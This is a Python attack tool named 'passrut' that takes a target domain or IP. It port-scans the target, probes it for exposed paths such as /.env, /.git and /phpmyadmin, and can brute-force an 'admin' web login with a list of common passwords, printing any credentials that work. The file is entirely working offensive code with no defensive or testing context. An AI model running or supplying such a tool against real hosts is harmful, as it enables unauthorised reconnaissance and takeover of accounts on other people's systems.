import socket
import requests
import sys
from datetime import datetime

# --- COLORS ---
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
WHITE = "\033[1;37m"
RESET = "\033[0m"

def scan_ports(target):
    print(f"{BLUE}[*] Scanning common ports for {target}...{RESET}")
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 8080, 8443]
    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"{GREEN}[+] Port {port} is OPEN!{RESET}")
        sock.close()

def vulnerability_scan(target):
    print(f"\n{BLUE}[*] Analyzing web vulnerabilities...{RESET}")
    paths = ["/admin", "/login", "/config.php", "/.env", "/.git", "/wp-admin", "/phpmyadmin"]
    for path in paths:
        url = f"http://{target}{path}"
        try:
            response = requests.get(url, timeout=3)
            if response.status_code == 200:
                print(f"{RED}[!] Found: {url} is ACCESSIBLE!{RESET}")
        except:
            pass

def brute_force(target):
    print(f"\n{RED}[!] Starting Password Exfiltration...{RESET}")
    passwords = ["123456", "password", "admin123", "root", "qwerty", "12345678", "admin"]
    username = "admin"
    login_url = f"http://{target}/login"
    
    for pwd in passwords:
        data = {"username": username, "password": pwd}
        try:
            res = requests.post(login_url, data=data, timeout=3)
            if "Welcome" in res.text or "Dashboard" in res.text or res.status_code == 302:
                print(f"{GREEN}[+++] SUCCESS! User: {username} | Pass: {pwd}{RESET}")
                return
        except:
            break
    print(f"{YELLOW}[-] Brute-force failed.{RESET}")

def main():
    # نمایش راهنمای سوییچ‌ها به رنگ سفید در ابتدای اجرا
    print(f"{WHITE}--- passrut Help Guide ---")
    print(f"Usage: python passrut.py -u <domain/ip> [-b]")
    print(f"-u : Set target domain or IP address")
    print(f"-b : Enable password brute-force mode")
    print(f"Example: python passrut.py -u target.com -b")
    print(f"---------------------------{RESET}\n")

    if len(sys.argv) < 2:
        sys.exit()

    target = ""
    do_brute = False

    for arg in sys.argv[1:]:
        if arg == "-u" and len(sys.argv) > sys.argv.index(arg) + 1:
            target = sys.argv[sys.argv.index(arg) + 1]
        if arg == "-b":
            do_brute = True

    if not target:
        print(f"{RED}[!] Target missing! Use -u{RESET}")
        sys.exit()

    start_time = datetime.now()
    scan_ports(target)
    vulnerability_scan(target)

    if do_brute:
        brute_force(target)

    end_time = datetime.now()
    print(f"\n{BLUE}[*] Finished in: {end_time - start_time}{RESET}")

if __name__ == "__main__":
    main()
  
